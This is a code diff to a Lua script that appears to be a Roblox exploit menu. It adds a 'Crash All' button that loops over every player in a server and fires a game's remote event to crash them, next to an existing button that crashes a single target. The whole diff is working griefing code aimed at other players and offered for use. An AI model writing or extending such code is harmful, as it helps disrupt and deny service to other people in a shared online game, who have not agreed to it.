@@ -115,8 +115,17 @@ do
         Title = "Exploit",
         Description = "Attempts to crash the target player.",
         Callback = function()
-            local http = game:GetService("HttpService")
             game.ReplicatedStorage.ReplicateHats.Bunny.BunnyTail.Handle.Mesh.Script.trig:FireServer(target)
+        end
+    })
+
+    Kicker:AddButton({
+        Title = "Crash All",
+        Description = "Attempts to crash every player in the server [EXTREMELY BLATANT!!].",
+        Callback = function()
+            for _, player in game.Players do
+                game.ReplicatedStorage.ReplicateHats.Bunny.BunnyTail.Handle.Mesh.Script.trig:FireServer(player)
+            end
         end
     })
 
